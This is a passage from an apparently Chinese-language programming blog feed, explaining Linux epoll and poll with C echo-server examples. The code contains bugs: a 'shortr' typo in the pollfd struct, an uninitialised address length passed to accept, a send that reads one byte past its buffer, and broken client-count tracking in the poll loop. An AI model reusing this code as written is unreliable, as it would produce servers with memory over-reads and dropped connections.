class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IPADDRESS   <span class="meta-string">"127.0.0.1"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT        8787</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE     1024</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTENQ     5</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FDSIZE      1000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> EPOLLEVENTS 100</span></div><div class="line"></div><div class="line"><span class="comment">//函数声明</span></div><div class="line"><span class="comment">//创建套接字并进行绑定</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">socket_bind</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ip,<span class="keyword">int</span> port)</span></span>;</div><div class="line"><span class="comment">//IO多路复用epoll</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_epoll</span><span class="params">(<span class="keyword">int</span> listenfd)</span></span>;</div><div class="line"><span class="comment">//事件处理函数</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">handle_events</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">struct</span> epoll_event *events,<span class="keyword">int</span> num,<span class="keyword">int</span> listenfd,<span class="keyword">char</span> *buf)</span>;</div><div class="line"><span class="comment">//处理接收到的连接</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_accpet</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> listenfd)</span></span>;</div><div class="line"><span class="comment">//读处理</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_read</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>;</div><div class="line"><span class="comment">//写处理</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_write</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>;</div><div class="line"><span class="comment">//添加事件</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span>;</div><div class="line"><span class="comment">//修改事件</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modify_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span>;</div><div class="line"><span class="comment">//删除事件</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span>  listenfd;</div><div class="line">    listenfd = socket_bind(IPADDRESS,PORT);</div><div class="line">    listen(listenfd,LISTENQ);</div><div class="line">    do_epoll(listenfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">socket_bind</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ip,<span class="keyword">int</span> port)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span>  listenfd;</div><div class="line">    <span class="keyword">struct</span> sockaddr_in servaddr;</div><div class="line">    listenfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (listenfd == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket error:"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    bzero(&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</div><div class="line">    servaddr.sin_family = AF_INET;</div><div class="line">    inet_pton(AF_INET,ip,&amp;servaddr.sin_addr);</div><div class="line">    servaddr.sin_port = htons(port);</div><div class="line">    <span class="keyword">if</span> (bind(listenfd,(<span class="keyword">struct</span> sockaddr*)&amp;servaddr,<span class="keyword">sizeof</span>(servaddr)) == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind error: "</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> listenfd;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_epoll</span><span class="params">(<span class="keyword">int</span> listenfd)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> epollfd;</div><div class="line">    <span class="keyword">struct</span> epoll_event events[EPOLLEVENTS];</div><div class="line">    <span class="keyword">int</span> ret;</div><div class="line">    <span class="keyword">char</span> buf[MAXSIZE];</div><div class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAXSIZE);</div><div class="line">    <span class="comment">//创建一个描述符</span></div><div class="line">    epollfd = epoll_create(FDSIZE);</div><div class="line">    <span class="comment">//添加监听描述符事件</span></div><div class="line">    add_event(epollfd,listenfd,EPOLLIN);</div><div class="line">    <span class="keyword">for</span> ( ; ; )</div><div class="line">    &#123;</div><div class="line">        <span class="comment">//获取已经准备好的描述符事件</span></div><div class="line">        ret = epoll_wait(epollfd,events,EPOLLEVENTS,<span class="number">-1</span>);</div><div class="line">        handle_events(epollfd,events,ret,listenfd,buf);</div><div class="line">    &#125;</div><div class="line">    close(epollfd);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">handle_events</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">struct</span> epoll_event *events,<span class="keyword">int</span> num,<span class="keyword">int</span> listenfd,<span class="keyword">char</span> *buf)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">int</span> fd;</div><div class="line">    <span class="comment">//进行选好遍历</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; num;i++)</div><div class="line">    &#123;</div><div class="line">        fd = events[i].data.fd;</div><div class="line">        <span class="comment">//根据描述符的类型和事件类型进行处理</span></div><div class="line">        <span class="keyword">if</span> ((fd == listenfd) &amp;&amp;(events[i].events &amp; EPOLLIN))</div><div class="line">            handle_accpet(epollfd,listenfd);</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLIN)</div><div class="line">            do_read(epollfd,fd,buf);</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLOUT)</div><div class="line">            do_write(epollfd,fd,buf);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">handle_accpet</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> listenfd)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> clifd;</div><div class="line">    <span class="keyword">struct</span> sockaddr_in cliaddr;</div><div class="line">    <span class="keyword">socklen_t</span>  cliaddrlen;</div><div class="line">    clifd = accept(listenfd,(<span class="keyword">struct</span> sockaddr*)&amp;cliaddr,&amp;cliaddrlen);</div><div class="line">    <span class="keyword">if</span> (clifd == <span class="number">-1</span>)</div><div class="line">        perror(<span class="string">"accpet error:"</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"accept a new client: %s:%d\n"</span>,inet_ntoa(cliaddr.sin_addr),cliaddr.sin_port);</div><div class="line">        <span class="comment">//添加一个客户描述符和事件</span></div><div class="line">        add_event(epollfd,clifd,EPOLLIN);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_read</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> nread;</div><div class="line">    nread = read(fd,buf,MAXSIZE);</div><div class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"read error:"</span>);</div><div class="line">        close(fd);</div><div class="line">        delete_event(epollfd,fd,EPOLLIN);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"client close.\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        delete_event(epollfd,fd,EPOLLIN);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read message is : %s"</span>,buf);</div><div class="line">        <span class="comment">//修改描述符对应的事件，由读改为写</span></div><div class="line">        modify_event(epollfd,fd,EPOLLOUT);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_write</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> nwrite;</div><div class="line">    nwrite = write(fd,buf,<span class="built_in">strlen</span>(buf));</div><div class="line">    <span class="keyword">if</span> (nwrite == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"write error:"</span>);</div><div class="line">        close(fd);</div><div class="line">        delete_event(epollfd,fd,EPOLLOUT);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        modify_event(epollfd,fd,EPOLLIN);</div><div class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,MAXSIZE);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> epoll_event ev;</div><div class="line">    ev.events = state;</div><div class="line">    ev.data.fd = fd;</div><div class="line">    epoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&amp;ev);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> epoll_event ev;</div><div class="line">    ev.events = state;</div><div class="line">    ev.data.fd = fd;</div><div class="line">    epoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&amp;ev);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modify_event</span><span class="params">(<span class="keyword">int</span> epollfd,<span class="keyword">int</span> fd,<span class="keyword">int</span> state)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> epoll_event ev;</div><div class="line">    ev.events = state;</div><div class="line">    ev.data.fd = fd;</div><div class="line">    epoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&amp;ev);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>至此，epoll的内容介绍完了。</p>
<p>References：</p>
<ul>
<li><p><a href="http://www.ccvita.com/515.html" target="_blank" rel="external">Epoll在LT和ET模式下的读写方式</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/Anker/p/3263780.html" target="_blank" rel="external">IO多路复用之epoll总结</a></p>
</li>
<li><p><a href="http://blog.csdn.net/ljx0305/article/details/4065058" target="_blank" rel="external">epoll使用详解</a></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是epoll？epoll是在2.6内核中提出的，是之前的select和poll的增强版本。它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://maoao530.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://maoao530.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>I/O Multiplexing &amp; poll</title>
    <link href="https://maoao530.github.io/2016/03/18/io-multiplexing-poll/"/>
    <id>https://maoao530.github.io/2016/03/18/io-multiplexing-poll/</id>
    <published>2016-03-18T15:46:00.000Z</published>
    <updated>2016-12-10T05:40:33.491Z</updated>
    
    <content type="html"><![CDATA[<p>poll和select实现功能差不多，但poll效率比select效率高。</p>
<a id="more"></a>
<h1 id="1-什么是I-O-Multiplexing"><a href="#1-什么是I-O-Multiplexing" class="headerlink" title="1. 什么是I/O Multiplexing"></a>1. 什么是I/O Multiplexing</h1><p> I / O多路转接(I/O multiplexing),其基本思想是:先构造一张有关描述符的表,然后调用一个函数,它要到这些描述符中的一个已准备好进行 I / O时才返回。<br>在返回时,它告诉进程哪一个描述符已准备好可以进行 I / O。<br>IO multiplexing就是我们说的select，poll，epoll，有些地方也称这种IO方式为event driven IO。其好处就在于单个process就可以同时处理多个网络连接的IO。</p>
<p><img src="/img/archives/io_mul.png" alt="I/O 多路复用"></p>
<p>poll的机制与select类似，与select在本质上没有多大差别，管理多个描述符也是进行轮询，根据描述符的状态进行处理，但是<strong>poll没有最大文件描述符数量的限制</strong>。poll和select同样存在一个缺点就是，包含大量文件描述符的数组被整体复制于用户态和内核的地址空间之间，而不论这些文件描述符是否就绪，它的开销随着文件描述符数量的增加而线性增大。</p>
<h1 id="2-poll函数"><a href="#2-poll函数" class="headerlink" title="2. poll函数"></a>2. poll函数</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span>  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span> <span class="params">( <span class="keyword">struct</span> pollfd * fds, <span class="keyword">unsigned</span> <span class="keyword">int</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</div></pre></td></tr></table></figure>
<ul>
<li>timeout == INFTIM 永远等待(INFTIM 通常等于-1)</li>
<li>timeout == 0 不等待</li>
<li>timeout &gt; 0 等待ttimeout毫秒</li>
</ul>
<p>与select不同,poll不是为每个条件构造一个描述符集,而是构造一个pollfd结构数组,每个数组元素指定一个描述符编号以及对其所关心的条件。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> pollfd &#123;  </div><div class="line"><span class="keyword">int</span> fd ;                <span class="comment">/* file descriptor to check, or &lt; 0 to ignore */</span>  </div><div class="line"><span class="keyword">short</span> events ;          <span class="comment">/* events of interest on fd */</span>  </div><div class="line">shortr events ;         <span class="comment">/* events that occurred on fd */</span>  </div><div class="line">&#125; ;</div></pre></td></tr></table></figure>
<p>简单点儿说，fd对应要监视的文件描述符，events对应需要监视的事件，revents对应实际发生的事件。</p>
<p><img src="/img/archives/poll-events-revents.png" alt="poll-events-revents"></p>
<p>返回值和错误代码:</p>
<ul>
<li>成功时，poll()返回结构体中revents域不为0的文件描述符个数</li>
<li>如果在超时前没有任何事件发生，poll()返回0；</li>
<li>失败时，poll()返回-1，并设置errno为下列值之一：<ul>
<li>EBADF　　       一个或多个结构体中指定的文件描述符无效。</li>
<li>EFAULTfds　　 指针指向的地址超出进程的地址空间。</li>
<li>EINTR　　　　  请求的事件之前产生一个信号，调用可以重新发起。</li>
<li>EINVALnfds　　参数超出PLIMIT_NOFILE值。</li>
</ul>
</li>
</ul>
<h1 id="3-利用poll设计的web服务器"><a href="#3-利用poll设计的web服务器" class="headerlink" title="3. 利用poll设计的web服务器"></a>3. 利用poll设计的web服务器</h1><p>设计一个比较简单的web服务器：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPORT 8008    <span class="comment">// the port users will be connecting to</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKLOG 10     <span class="comment">// how many pending connections queue will hold</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 200</span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> pollfd pollfds[BACKLOG + <span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> nfds = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showclient</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"client count: %d\n"</span>, nfds <span class="number">-1</span>);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BACKLOG + <span class="number">1</span>; i++) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[%d]:%d  "</span>, i, pollfds[i].fd);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> sock_fd, new_fd;  <span class="comment">// listen on sock_fd, new connection on new_fd</span></div><div class="line">    <span class="keyword">struct</span> sockaddr_in server_addr;    <span class="comment">// server address information</span></div><div class="line">    <span class="keyword">struct</span> sockaddr_in client_addr; <span class="comment">// connector's address information</span></div><div class="line">    <span class="keyword">socklen_t</span> sin_size;</div><div class="line">    <span class="keyword">int</span> yes = <span class="number">1</span>;</div><div class="line">    <span class="keyword">char</span> buf[BUF_SIZE];</div><div class="line">    <span class="keyword">int</span> ret;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"socket"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"setsockopt"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    server_addr.sin_family = AF_INET;         <span class="comment">// host byte order</span></div><div class="line">    server_addr.sin_port = htons(MYPORT);     <span class="comment">// short, network byte order</span></div><div class="line">    server_addr.sin_addr.s_addr = INADDR_ANY; <span class="comment">// automatically fill with my IP</span></div><div class="line">    <span class="built_in">memset</span>(server_addr.sin_zero, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(server_addr.sin_zero));</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (bind(sock_fd, (<span class="keyword">struct</span> sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"bind"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (listen(sock_fd, BACKLOG) == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"listen"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"listen port %d\n"</span>, MYPORT);</div><div class="line"></div><div class="line">    sin_size = <span class="keyword">sizeof</span>(client_addr);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; BACKLOG + <span class="number">1</span>; i++)</div><div class="line">    &#123;</div><div class="line">        pollfds[i].fd = <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    pollfds[<span class="number">0</span>].fd = sock_fd;</div><div class="line">    pollfds[<span class="number">0</span>].events = POLLIN;</div><div class="line">    nfds++;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        ret = poll(pollfds, nfds, <span class="number">-1</span>);</div><div class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"poll"</span>);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"timeout.\n"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// add a new client</span></div><div class="line">        <span class="keyword">if</span> (pollfds[<span class="number">0</span>].revents &amp; POLLIN)</div><div class="line">        &#123;</div><div class="line">            new_fd = accept(sock_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;sin_size);</div><div class="line">            <span class="keyword">if</span> (new_fd &lt;= <span class="number">0</span>) &#123;</div><div class="line">                perror(<span class="string">"accept"</span>);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; BACKLOG + <span class="number">1</span>; i++)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (pollfds[i].fd == <span class="number">-1</span>)</div><div class="line">                &#123;</div><div class="line">                    pollfds[i].fd = new_fd;</div><div class="line">                    pollfds[i].events = POLLIN;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"add a new client: pollfds[%d] = %d \n"</span>,i,new_fd);</div><div class="line">                    nfds++;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// check every client</span></div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; nfds; i++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (pollfds[i].revents &amp; POLLIN)</div><div class="line">            &#123;</div><div class="line">                ret = recv(pollfds[i].fd, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</div><div class="line">                <span class="keyword">char</span> str[] = <span class="string">"Good,very nice!\n"</span>;</div><div class="line"></div><div class="line">                send(pollfds[i].fd, str, <span class="keyword">sizeof</span>(str) + <span class="number">1</span>, <span class="number">0</span>);</div><div class="line">                <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;        <span class="comment">// client close</span></div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"client[%d] close\n"</span>, i);</div><div class="line">                    close(pollfds[i].fd);</div><div class="line">                    pollfds[i].fd = <span class="number">-1</span>;</div><div class="line">                    nfds--;</div><div class="line">                &#125; <span 